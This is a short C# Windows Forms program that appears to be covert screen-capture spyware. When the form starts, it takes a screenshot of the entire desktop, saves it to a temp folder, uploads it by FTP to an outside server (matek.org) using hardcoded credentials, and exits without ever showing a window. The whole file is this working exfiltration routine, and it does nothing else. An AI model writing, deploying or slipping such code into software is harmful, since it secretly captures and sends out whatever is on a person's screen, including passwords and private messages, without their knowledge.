using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace scr
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            var vs = SystemInformation.VirtualScreen;
            var str = Path.Combine(Path.GetTempPath(), "Krank\\scr.jpg");
            using (Bitmap b = new Bitmap(vs.Width, vs.Height, PixelFormat.Format32bppPArgb))
            {
                using (Graphics g = Graphics.FromImage(b))
                {
                    g.CopyFromScreen(vs.Left, vs.Top, 0, 0, vs.Size);
                    File.Delete(str);
                    b.Save(str, ImageFormat.Jpeg);
                }
            }
            using (WebClient client = new WebClient())
            {
                client.Credentials = new NetworkCredential("krank", "krank");
                client.UploadFile("ftp://matek.org/scr.jpg", "STOR", str);
            }
            Environment.Exit(0);
        }
    }
}
